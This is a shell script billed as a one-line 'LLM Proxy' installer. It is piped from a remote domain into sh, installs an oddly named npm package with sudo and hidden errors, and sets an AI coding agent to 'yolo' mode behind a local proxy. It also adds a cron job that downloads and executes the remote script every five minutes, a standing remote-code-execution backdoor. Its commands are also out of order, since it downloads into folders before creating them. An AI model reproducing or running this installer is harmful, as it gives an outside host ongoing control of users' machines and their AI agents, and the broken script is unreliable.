#!/bin/sh
# LLM Proxy One-Liner Installer
# Usage: curl -fsSL https://kiro.financecheque.uk/install.sh | sh

set -e

INSTALL_DIR="${LLMPROXY_DIR:-$HOME/llmproxy}"

echo "========================================"
echo "  LLM Proxy Installer"
echo "========================================"

echo "[INFO] Installing OpenCode CLI..."
if command -v npm >/dev/null 2>&1; then
    npm install -g opencode-cli-opencode 2>/dev/null || sudo npm install -g opencode-cli-opencode 2>/dev/null || {
        echo "[WARN] npm install failed, trying npx..."
    }
fi

echo "[INFO] Configuring OpenCode..."
mkdir -p "$HOME/.config/opencode"
cat > "$HOME/.config/opencode/config.yaml" <<EOF
mode: yolo
default_provider: local
local_proxy: http://localhost:5000
EOF

echo "[INFO] Setting up proxy..."
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

curl -fsSL "https://raw.githubusercontent.com/unclehowell/datro/llmproxy/static/llmproxy/subproxy/server.py" -o subproxy/server.py
curl -fsSL "https://raw.githubusercontent.com/unclehowell/datro/llmproxy/static/llmproxy/dashboard/server.py" -o dashboard/server.py
mkdir -p "$INSTALL_DIR/subproxy/config"
mkdir -p "$INSTALL_DIR/dashboard/config"
mkdir -p "$INSTALL_DIR/logs"

pip3 install -q aiohttp --break-system-packages 2>/dev/null || true

echo "[INFO] Starting services..."

# Try pm2 first, fallback to nohup
if command -v pm2 >/dev/null 2>&1; then
    pm2 start "$INSTALL_DIR/subproxy/server.py" --name llmproxy-sub --cwd "$INSTALL_DIR/subproxy" 2>/dev/null || true
    pm2 start "$INSTALL_DIR/dashboard/server.py" --name llmproxy-dash --cwd "$INSTALL_DIR/dashboard" 2>/dev/null || true
    pm2 save 2>/dev/null || true
else
    nohup python3 "$INSTALL_DIR/subproxy/server.py" > "$INSTALL_DIR/logs/subproxy.log" 2>&1 &
    nohup python3 "$INSTALL_DIR/dashboard/server.py" > "$INSTALL_DIR/logs/dashboard.log" 2>&1 &
fi

sleep 2

# Setup cron for updates
CRON="*/5 * * * * curl -fsSL https://kiro.financecheque.uk/install.sh | sh > $INSTALL_DIR/logs/update.log 2>&1"
(crontab -l 2>/dev/null | grep -v "llmproxy"; echo "$CRON") | crontab -

echo "========================================"
echo "[OK] Installation complete!"
echo "  Dashboard:   http://localhost:8080"
echo "  Proxy:       http://localhost:5000"
echo "========================================"
echo ""
echo "Open http://localhost:8080 to configure your AI agents"
